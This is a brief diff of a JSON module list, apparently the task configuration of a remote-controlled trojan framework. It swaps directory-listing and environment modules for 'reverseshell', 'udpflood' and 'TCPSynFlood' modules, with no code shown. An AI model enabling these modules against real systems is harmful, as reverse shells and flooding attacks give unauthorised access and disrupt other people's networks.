@@ -1,8 +1,11 @@
 [	
 	{
-	"module" : "dirlister"
+	"module" : "reverseshell"
 	},
 	{
-	"module" : "enviornment"
+	"module" : "udpflood"
+	},
+	{
+	"module" : "TCPSynFlood"
 	}
 ]
